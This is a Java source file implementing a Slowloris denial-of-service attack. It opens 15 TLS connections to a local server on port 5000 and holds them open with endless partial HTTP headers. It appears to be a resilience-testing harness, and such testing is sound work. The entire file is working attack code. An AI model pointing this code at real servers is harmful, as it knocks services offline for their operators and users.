package safety.attacks;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.*;
import java.util.Random;

public class SlowlorisAttack {
    private static final String SERVER_IP = "127.0.0.1";
    private static final int SERVER_PORT = 5000;
    private static final int NUM_CONNECTIONS = 15;
    private static final Random random = new Random();
    private static int successfulConnections = 0;

    public static void main(String[] args) {
        System.out.println("🦥 Starting Slowloris Attack Simulation");
        System.out.println("=====================================");
        System.out.println("Target: " + SERVER_IP + ":" + SERVER_PORT);
        System.out.println("Attempting to establish " + NUM_CONNECTIONS + " slow connections...\n");

        // Trust all certificates for testing
        System.setProperty("javax.net.ssl.trustStore", "client.truststore");
        System.setProperty("javax.net.ssl.trustStorePassword", "password");

        for (int i = 0; i < NUM_CONNECTIONS; i++) {
            final int connectionId = i + 1;
            new Thread(() -> {
                try {
                    SSLSocketFactory sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                    SSLSocket socket = (SSLSocket) sslSocketFactory.createSocket(SERVER_IP, SERVER_PORT);

                    OutputStream out = socket.getOutputStream();
                    String initialRequest = "GET / HTTP/1.1\r\n" +
                            "Host: localhost\r\n" +
                            "User-Agent: Mozilla/5.0\r\n";

                    out.write(initialRequest.getBytes());
                    out.flush();

                    synchronized(SlowlorisAttack.class) {
                        successfulConnections++;
                        System.out.printf("📡 Connection %d/%d established (Total active: %d)\n",
                                connectionId, NUM_CONNECTIONS, successfulConnections);
                    }

                    // Keep connection alive with partial headers
                    int headerCount = 0;
                    while (!socket.isClosed()) {
                        String partialHeader = generateRandomHeader(headerCount++);
                        out.write(partialHeader.getBytes());
                        out.flush();

                        // Random delay between 1-3 seconds
                        Thread.sleep(1000 + random.nextInt(2000));
                    }
                } catch (Exception e) {
                    synchronized(SlowlorisAttack.class) {
                        successfulConnections--;
                        System.out.printf("❌ Connection %d terminated: %s (Active connections: %d)\n",
                                connectionId, e.getMessage(), successfulConnections);
                    }
                }
            }, "Slowloris-" + connectionId).start();

            // Small delay between connection attempts
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }

    private static String generateRandomHeader(int count) {
        String[] headerNames = {"X-Custom", "X-Slow", "X-Random", "X-Header"};
        String headerName = headerNames[random.nextInt(headerNames.length)];
        return String.format("%s-%d: %d\r\n", headerName, count, random.nextInt(1000));
    }
}